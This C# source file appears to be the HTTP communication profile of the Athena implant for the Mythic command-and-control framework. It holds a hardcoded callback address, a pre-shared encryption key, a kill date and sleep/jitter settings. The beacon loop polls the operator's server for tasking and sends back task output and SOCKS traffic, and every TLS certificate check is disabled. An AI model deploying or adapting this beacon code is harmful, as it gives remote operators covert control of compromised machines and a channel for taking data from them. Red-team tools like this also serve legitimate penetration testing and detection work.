using Athena.Commands;
using Athena.Models.Athena.Commands;
using Athena.Models.Config;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Response;
using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading.Tasks;

namespace Athena.Profiles.HTTP
{
    public class HTTPNew : IProfile
    {
        public string uuid { get; set; }
        private string userAgent { get; set; }
        private string hostHeader { get; set; }
        private string getURL { get; set; }
        private string postURL { get; set; }
        public string psk { get; set; }
        private string proxyHost { get; set; }
        private string proxyPass { get; set; }
        private string proxyUser { get; set; }
        private bool encryptedExchangeCheck { get; set; }
        public bool encrypted { get; set; }
        private int maxAttempts = 5;
        private int currentAttempt { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public PSKCrypto crypt { get; set; }
        private HttpClient client { get; set; }
        public DateTime killDate { get; set; }
        private CancellationTokenSource cts = new CancellationTokenSource();
        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;

        public HTTPNew()
        {
            HttpClientHandler handler = new HttpClientHandler();
            int callbackPort = Int32.Parse("80");
            string callbackHost = "http://192.168.4.216";
            string getUri = "index";
            string queryPath = "q";
            string postUri = "data";
            this.userAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
            this.hostHeader = "";
            this.getURL = $"{callbackHost}:{callbackPort}/{getUri}?{queryPath}=";
            this.postURL = $"{callbackHost}:{callbackPort}/{postUri}";
            this.proxyHost = ":";
            this.proxyPass = "q";
            this.proxyUser = "";
            this.psk = "+qrNsSLwgfWZGxT135WGwZX6Ozz0vRsGOTVl1eTE+lw=";
            this.uuid = "f1be523c-d41d-4060-956e-62e44947c0a5";
            DateTime kd = DateTime.TryParse("2024-03-12", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("10", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("23", out jitter) ? jitter : 10;
            this.jitter = jitter;
            //Might need to make this configurable
            ServicePointManager.ServerCertificateValidationCallback =
                   new RemoteCertificateValidationCallback(
                        delegate
                        { return true; }
                    );


            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
            {
                WebProxy wp = new WebProxy()
                {
                    Address = new Uri(this.proxyHost)
                };

                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
                {
                    handler.DefaultProxyCredentials = new NetworkCredential(this.proxyUser, this.proxyPass);
                }
                handler.Proxy = wp;
            }

            this.client = new HttpClient(handler);

            if (!string.IsNullOrEmpty(this.hostHeader))
            {
                this.client.DefaultRequestHeaders.Host = this.hostHeader;
            }

            if (!string.IsNullOrEmpty(this.userAgent))
            {
                this.client.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
            }

            //Doesn't do anything yet
            this.encryptedExchangeCheck = bool.Parse("False");

            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(this.uuid, this.psk);
                this.encrypted = true;
            }
        }
        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            int maxAttempts = 3;
            int currentAttempt = 0;
            do
            {
                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

                if (!string.IsNullOrEmpty(res))
                {
                    return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
                }
                currentAttempt++;
            } while (currentAttempt <= maxAttempts);

            return new CheckinResponse()
            {
                status = "failed"
            };
        }
        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            while (!cts.Token.IsCancellationRequested)
            {
                await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
                Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
                Task<List<SocksMessage>> socksTask = SocksResponseHandler.GetSocksMessagesAsync();
                await Task.WhenAll(responseTask, delegateTask, socksTask);

                List<string> responses = await responseTask;

                GetTasking gt = new GetTasking()
                {
                    action = "get_tasking",
                    tasking_size = -1,
                    delegates = await delegateTask,
                    socks = await socksTask,
                    responses = responses,
                };
                try
                {
                    string responseString = await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));

                    if (String.IsNullOrEmpty(responseString))
                    {
                        this.currentAttempt++;
                        continue;
                    }

                    GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                    if (gtr == null)
                    {
                        this.currentAttempt++;
                        continue;
                    }

                    this.currentAttempt = 0;

                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);

                    this.SetTaskingReceived(this, tra);
                }
                catch (Exception e)
                {
                    Debug.WriteLine($"[{DateTime.Now}] Becaon attempt failed {e}");
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cts.Cancel();
                }
            }
        }
        public bool StopBeacon()
        {
            cts.Cancel();
            return true;
        }
        internal async Task<string> Send(string json)
        {
            try
            {
                Debug.WriteLine($"[{DateTime.Now}] Message to Mythic: {json}");
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(this.uuid + json);
                }

                HttpResponseMessage response;

                if (json.Length < 2000) //Max URL length
                {
                    Debug.WriteLine($"[{DateTime.Now}] Sending as GET");
                    response = await this.client.GetAsync(this.getURL + WebUtility.UrlEncode(json));
                }
                else
                {
                    Debug.WriteLine($"[{DateTime.Now}] Sending as POST");
                    response = await this.client.PostAsync(this.postURL, new StringContent(json));
                }

                Debug.WriteLine($"[{DateTime.Now}] Got Response with code: {response.StatusCode}");

                string strRes = await response.Content.ReadAsStringAsync();

                if (this.encrypted)
                {
                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {this.crypt.Decrypt(strRes)}");
                    return this.crypt.Decrypt(strRes);
                }

                if (!string.IsNullOrEmpty(strRes))
                {
                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {Misc.Base64Decode(strRes).Result.Substring(36)}");
                    return (await Misc.Base64Decode(strRes)).Substring(36);
                }

                return String.Empty;
            }
            catch
            {
                return String.Empty;
            }
        }
    }

}
